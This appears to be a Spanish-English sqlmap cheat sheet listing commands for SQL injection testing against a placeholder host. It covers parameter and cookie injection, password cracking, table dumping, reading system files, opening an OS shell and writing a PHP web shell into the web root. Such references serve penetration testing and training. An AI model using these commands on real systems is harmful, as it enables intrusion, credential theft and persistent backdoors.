<h1 align="center">SQLMap Cheat Sheet</h1>

<p align="center">
  Comprehensive reference guide for automated SQL injection testing, enumeration techniques, data exfiltration, WAF evasion, and advanced attack vectors.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Web_Security-111827?style=for-the-badge&logo=owasp&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/OffSec-Techniques-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/SQLMap-Automated_Exploitation-111827?style=for-the-badge&logoColor=00FFFF">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>


<br>
<br>
<br>

## Basic Inyections

```
sqlmap -u "http://prueba.com/info.php?action=login" 
```
<br>

Datos del login que van en dos variables
```
sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc"
```
<br>

Uso de Cookies
```
sqlmap -u 'http://prueba.com/info.php?action=login' --cookie="PHPSESSIONS=2wfertyrywsegy34526"
```
<br>

Indicar a todas las preguntas un Yes all
```
sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc" --batch 
```

<br>

Enumera y craking de las contraseñas de los usuarios de la BD
```
sqlmap -u "http://www.prueba.com/?id=1" --passwords --batch
```


```
sqlmap -u "http://prueba.com/info.php?action=login" --tables -D testdb
```
> View tables

```
sqlmap -u "http://prueba.com/info.php?action=login" -D testdb -T users --dump
```
> Dumping table users

```
sqlmap -u "http://prueba.com/info.php?action=login" -D testdb -T users -C name,surname --dump
```
>Dumping table users columns name and surname

<br>
<br>
<br>
<br>

## Basic Parameters

Tipo Verbose
```
-v {1..6}
```

<br>

Injection de tipo B,E,U,S,T,Q
```
--technique=E
```

> B: Boolean-based blind |
> E: Error-based |
> U: Union query-based | 
> S: Stacked queries | 
> T: Time-based blind |
> Q: Inline queries |

<br>

Saber version de la BD, nombre del usuario actual,nombre de la BD actual , permisos del usuario.
```
--banner --current-user --current-db --is-dba
```
<br>


Indicar otro metodo. PUT , HEAD , GET , POST , DELETE , OPTIONS , PATCH
```
 --method PUT
```
<br>

Shell del S.O
```
--os-shell
```

<br>

Read Files
```
---file-read "/etc/password"
```
> Output " ~/.sqlmap/output/www.prueba.com/files/_etc_password"

<br>

Write Files
```
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
